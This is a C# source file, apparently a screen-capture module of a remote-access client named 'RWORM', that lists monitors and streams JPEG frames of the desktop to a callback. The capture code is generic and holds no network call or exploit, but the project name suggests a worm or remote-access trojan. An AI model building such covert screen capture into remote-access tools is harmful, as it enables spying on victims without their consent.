using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public class RemoteDesktop : IDisposable
    {
        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumDelegate lpfnEnum, IntPtr dwData);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFOEX lpmi);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        private delegate bool MonitorEnumDelegate(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MONITORINFOEX
        {
            public int cbSize;
            public RECT rcMonitor;
            public RECT rcWork;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string szDevice;
        }

        public class ScreenInfo
        {
            public int Index { get; set; }
            public string Name { get; set; } = string.Empty;
            public int X { get; set; }
            public int Y { get; set; }
            public int Width { get; set; }
            public int Height { get; set; }
            public bool IsPrimary { get; set; }
        }

        private CancellationTokenSource? _cts;
        private bool _running;

        public Func<byte[], Task>? OnFrame { get; set; }
        public int Fps { get; set; } = 5;
        public int Quality { get; set; } = 40;
        public int MonitorIndex { get; set; } = 0; // 0 = Display 1, etc. -1 = Virtual desktop (all monitors)

        public bool IsRunning => _running;

        public static List<ScreenInfo> GetMonitors()
        {
            var list = new List<ScreenInfo>();
            int idx = 0;

            EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, (IntPtr hMon, IntPtr hdc, ref RECT rc, IntPtr data) =>
            {
                var mi = new MONITORINFOEX();
                mi.cbSize = Marshal.SizeOf(typeof(MONITORINFOEX));
                if (GetMonitorInfo(hMon, ref mi))
                {
                    int w = mi.rcMonitor.right - mi.rcMonitor.left;
                    int h = mi.rcMonitor.bottom - mi.rcMonitor.top;
                    bool primary = (mi.dwFlags & 1) != 0;
                    list.Add(new ScreenInfo
                    {
                        Index = idx++,
                        Name = string.IsNullOrEmpty(mi.szDevice) ? $"Display {idx}" : mi.szDevice,
                        X = mi.rcMonitor.left,
                        Y = mi.rcMonitor.top,
                        Width = w,
                        Height = h,
                        IsPrimary = primary
                    });
                }
                return true;
            }, IntPtr.Zero);

            if (list.Count == 0)
            {
                int w = GetSystemMetrics(SM_CXSCREEN);
                int h = GetSystemMetrics(SM_CYSCREEN);
                list.Add(new ScreenInfo
                {
                    Index = 0,
                    Name = "Primary Display",
                    X = 0,
                    Y = 0,
                    Width = w > 0 ? w : 1920,
                    Height = h > 0 ? h : 1080,
                    IsPrimary = true
                });
            }

            return list;
        }

        public static byte[] GetMonitorsJson()
        {
            var monitors = GetMonitors();
            return System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(monitors));
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            _cts = new CancellationTokenSource();
            _ = Task.Run(CaptureLoop, _cts.Token);
        }

        public void Stop()
        {
            _running = false;
            _cts?.Cancel();
        }

        private async Task CaptureLoop()
        {
            int interval = 1000 / Math.Max(1, Fps);
            var enc = GetJpegEncoder();

            while (_running && !(_cts?.IsCancellationRequested ?? true))
            {
                try
                {
                    var monitors = GetMonitors();
                    Rectangle bounds;

                    if (MonitorIndex >= 0 && MonitorIndex < monitors.Count)
                    {
                        var m = monitors[MonitorIndex];
                        bounds = new Rectangle(m.X, m.Y, m.Width, m.Height);
                    }
                    else
                    {
                        int w = GetSystemMetrics(SM_CXSCREEN);
                        int h = GetSystemMetrics(SM_CYSCREEN);
                        bounds = new Rectangle(0, 0, w > 0 ? w : 1920, h > 0 ? h : 1080);
                    }

                    if (bounds.Width > 0 && bounds.Height > 0)
                    {
                        using var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                        using (var g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                        }

                        byte[] frame;
                        using (var ms = new MemoryStream())
                        using (var encParms = new EncoderParameters(1))
                        {
                            encParms.Param[0] = new EncoderParameter(Encoder.Quality, (long)Quality);
                            bmp.Save(ms, enc, encParms);
                            frame = ms.ToArray();
                        }

                        if (OnFrame != null)
                            await OnFrame(frame);
                    }
                }
                catch { }

                await Task.Delay(interval);
            }
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.FormatID == ImageFormat.Jpeg.Guid) return c;
            throw new NotSupportedException("JPEG encoder not found");
        }

        public void Dispose() => Stop();
    }
}
